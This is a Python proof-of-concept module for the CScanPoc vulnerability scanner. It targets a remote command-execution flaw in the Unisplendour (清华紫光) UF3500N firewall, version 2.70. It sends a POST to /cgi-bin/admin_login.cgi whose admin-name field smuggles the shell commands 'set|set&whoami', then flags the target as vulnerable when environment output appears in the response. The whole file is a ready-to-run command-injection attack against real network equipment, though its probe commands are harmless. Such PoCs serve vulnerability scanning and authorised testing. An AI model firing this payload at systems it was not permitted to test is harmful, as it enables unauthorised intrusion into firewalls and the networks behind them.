# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'UNIS_0003'  # 平台漏洞编号，留空
    name = '清华紫光硬件防火墙 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-05-24'  # 漏洞公布时间
    desc = '''
        清华紫光UF3500N防火墙2.70版命令执行漏洞:/cgi-bin/admin_login.cgi
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '清华紫光硬件防火墙'  # 漏洞应用名称
    product_version = 'UF3504 2.70'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '284087fb-b47c-44ee-98e8-732049c967fa'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #http://www.wooyun.org/bugs/wooyun-2010-0115756
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/cgi-bin/admin_login.cgi'
            postdata = "login=%b9%dc%c0%ed%d4%b1%b5%c7%c2%bc&adminname=%22set%7cset%26whoami%22&adminpasswd=123456"
            code, head, res, errcode, _ = hh.http(url, post=postdata)

            if code==200 and 'DOCUMENT_ROOT' in res:
                #security_hole("清华紫光UF3500N防火墙2.70版命令执行:http://www.wooyun.org/bugs/wooyun-2010-0115756")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
